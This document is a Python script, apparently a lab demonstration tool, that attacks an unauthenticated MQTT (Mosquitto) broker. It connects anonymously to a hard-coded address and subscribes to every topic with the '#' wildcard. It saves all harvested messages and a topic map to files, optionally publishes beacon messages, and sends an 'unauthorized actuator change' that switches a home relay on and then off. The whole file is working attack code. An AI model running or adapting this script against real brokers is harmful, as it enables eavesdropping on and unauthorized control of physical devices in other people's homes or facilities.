#Control Version 1.1

import argparse
import sys
import time

ERROR        = '\033[91m [!!!]\033[0m'
WARNING      = '\033[93m [*]\033[0m'
NOTIFICATION = '\033[96m[+]\033[0m'
COLOUR_END   = '\033[0m'
UNDERLINE    = '\033[4m'

try:
    import paho.mqtt.client as mqtt  
except ImportError:
    sys.exit(f"{ERROR} Error: paho-mqtt not installed. Run: sudo pip3 install paho-mqtt")


class finalFile_Print:
    harvestFile   = "mqtt_harvest.txt"
    topicMap_File = "mqtt_topic_map.txt"

    def __str__(self):
        return f"{self.harvestFile} and {self.topicMap_File}"


brokerHost    = "10.10.10.40"
brokerPort    = 1883
harvestSecs   = 30
actuatorTopic = "home/actuators/relay"
beaconTopic   = "home/status/hb"
clientID      = "kali_probe_01"

topicSet = set()
messages = []

def on_connect(client, userdata, flags, reasonCode, properties=None):
    if reasonCode == 0:
        print(f"{NOTIFICATION} Connected to {brokerHost}:{brokerPort} anonymously: no authentication used")
        client.subscribe("#", qos=0)
        print(f"{NOTIFICATION} Wildcard '#' subscribed: all topics to be forwarded.")
    else:
        print(f"{WARNING} MQTT Broker unable to connect on 1883 ({reasonCode})")
        sys.exit(1)

def on_message(client, userdata, msg):
    ts      = time.strftime("%H:%M:%S")
    topic   = msg.topic
    payload = msg.payload.decode("utf-8", errors="replace")
    print(f"{NOTIFICATION} [{ts}] - {topic:<35}: {payload}")

    topicSet.add(topic)
    messages.append((ts, topic, payload))

def on_disconnect(client, userdata, disconnect_flags, reasonCode, properties=None):
    if reasonCode != 0:
        print(f"{WARNING} Unexpected disconnect ({reasonCode})")

def beaconChannel(client, count, interval):
    print(f"\n{NOTIFICATION} Beacon channel on '{beaconTopic}' | ({count}, {interval}s)")
    for i in range(1, count + 1):
        client.publish(beaconTopic, payload=f"beacon-{i}", qos=0)
        print(f"{NOTIFICATION} [{time.strftime('%H:%M:%S')}] beacon {i}/{count}")
        if i < count:
            time.sleep(interval)
    print(f"{WARNING} Beacon complete.")

def main():
    parser = argparse.ArgumentParser(description="Anonymous Mosquitto client (MQTT) probe")
    parser.add_argument("--time", type=int, default=harvestSecs,
                        help=f"Harvest duration in seconds (default: {harvestSecs})")
    parser.add_argument("--beacon", type=int, default=0, metavar="N",
                        help="Publish N fixed-interval beacon messages (0 disables)")
    parser.add_argument("--beacon-interval", type=int, default=10, metavar="S",
                        help="Seconds between beacon publishes (default: 10)")
    args = parser.parse_args()

    client = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2,
        client_id=clientID,
    )
    client.on_connect    = on_connect
    client.on_message    = on_message
    client.on_disconnect = on_disconnect

    print(f"{NOTIFICATION} Connecting to: {brokerHost}:{brokerPort}")
    try:
        client.connect(brokerHost, brokerPort, keepalive=30)
    except OSError as e:
        print(f"{ERROR} Connection failed: {e}")
        sys.exit(1)

    client.loop_start()

    print(f"{NOTIFICATION} Harvesting for {args.time}s")
    print(f"{UNDERLINE}Enter 'CTRL + C' to force termination.{COLOUR_END}")
    try:
        time.sleep(args.time)
    except KeyboardInterrupt:
        print(f"\n{WARNING} Harvest attempt forcefully terminated.")

    with open(finalFile_Print.harvestFile, "w") as f:
        f.write(f"MQTT # Harvest completed | Duration: {args.time}s\n")
        f.write(f"# Broker: {brokerHost}:{brokerPort}\n")
        for ts, topic, payload in messages:
            f.write(f"{ts} {topic} {payload}\n")
    print(f"{NOTIFICATION} Harvest data placed in {finalFile_Print.harvestFile}")
    print(f"{NOTIFICATION} {len(messages)} messages saved.")

    with open(finalFile_Print.topicMap_File, "w") as f:
        f.write("MQTT # Map completed\n")
        for t in sorted(topicSet):
            f.write(t + "\n")
    print(f"{NOTIFICATION} Topic data placed in {finalFile_Print.topicMap_File}")
    print(f"{NOTIFICATION} {len(topicSet)} topics discovered.")

    if args.beacon > 0:
        beaconChannel(client, args.beacon, args.beacon_interval)

    print(f"\n{NOTIFICATION} Unauthorized actuator change demonstration on: '{actuatorTopic}'")
    rc, mid = client.publish(actuatorTopic, payload="on", qos=0)
    if rc == mqtt.MQTT_ERR_SUCCESS:
        print(f"{NOTIFICATION} Published: {actuatorTopic} = on")
        print(f"{NOTIFICATION} RELAY ACTIVE")
    else:
        print(f"{WARNING} Publish returned rc={rc}")
        print(f"{UNDERLINE}Check broker connection before reattempting.{COLOUR_END}")

    time.sleep(2)

    client.publish(actuatorTopic, payload="off", qos=0)
    print(f"{NOTIFICATION} Published: {actuatorTopic} = off")
    print(f"{WARNING} Relay reset - all changes reversed.")
    time.sleep(1)

    client.loop_stop()
    client.disconnect()

    print("\n" + "-" * 60)
    print(f"{NOTIFICATION} Probing complete.")
    print(f"Refer to {finalFile_Print()} for relevant information.")

if __name__ == "__main__":
    main()